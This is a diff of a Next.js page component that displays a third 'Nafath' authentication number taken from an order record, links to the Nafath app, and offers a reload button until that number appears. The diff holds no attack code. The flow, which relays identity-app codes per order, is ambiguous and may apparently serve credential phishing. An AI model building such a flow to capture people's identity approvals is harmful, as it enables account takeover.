@@ -6,7 +6,7 @@ import Link from 'next/link'
 import { useEffect, useState } from 'react'
 import SwiperSlider from '@/components/SwiperSlider'
 
-const NafatApp = () => {
+const NafatOtpThree = () => {
   const router = useRouter()
   const params = useSearchParams()
 
@@ -31,11 +31,17 @@ const NafatApp = () => {
     toast.success('Your order has been confirmed')
   }
 
+  const reload = () => {
+    window.location.reload()
+  }
+
   return (
     <>
       <SwiperSlider />
       <div className="max-w-[1400px] mx-auto flex flex-col justify-center items-center ">
-        <h1 className="text-4xl font-bold text-gray-600 mt-10">Nafath App</h1>
+        <h1 className="text-4xl font-bold text-gray-600 mt-10">
+          Nafath App OTP3
+        </h1>
         {/* make this link as a button */}
 
         <p className="text-gray-600 text-center mt-5 font-bold">
@@ -48,7 +54,7 @@ const NafatApp = () => {
 
         <div className="flex justify-center items-center gap-2 rounded-full border-2 h-16 w-16">
           <p className="text-gray-600 text-center m-0 font-bold">
-            {order.nafatOtp ? order.nafatOtp : 'N/A'}
+            {order.nafatOtpThree ? order.nafatOtpThree : 'N/A'}
           </p>
         </div>
 
@@ -59,18 +65,27 @@ const NafatApp = () => {
         >
           OPEN NAFATH APP
         </Link>
-        <form onSubmit={handleSubmit} className="w-3/4 my-14">
+        {order.nafatOtpThree ? (
+          <form onSubmit={handleSubmit} className="w-3/4 my-14">
+            <button
+              type="submit"
+              className="flex gap-2 justify-center items-center rounded-sm font-bold w-full px-4 py-2 text-md tracking-wide text-white capitalize transition-colors duration-200 transform bg-teal-500 hover:bg-teal-600 focus:outline-none focus:bg-teal-600"
+            >
+              Continue To Another Order <FaArrowRightLong size={16} />
+            </button>
+          </form>
+        ) : (
           <button
-            type="submit"
-            className="flex gap-2 justify-center items-center rounded-sm font-bold w-full px-4 py-2 text-md tracking-wide text-white capitalize transition-colors duration-200 transform bg-teal-500 hover:bg-teal-600 focus:outline-none focus:bg-teal-600"
+            onClick={reload}
+            className="flex gap-2 justify-center items-center rounded-sm font-bold my-14 w-3/4 px-4 py-2 text-md tracking-wide text-white capitalize transition-colors duration-200 transform bg-gray-500 hover:bg-gray-600 focus:outline-none focus:bg-gray-600"
           >
-            Confirm Order <FaArrowRightLong size={16} />
+            Reload Page
           </button>
-        </form>
+        )}
       </div>
       <div className="h-20 bg-teal-400 mt-5"></div>
     </>
   )
 }
 
-export default NafatApp
+export default NafatOtpThree
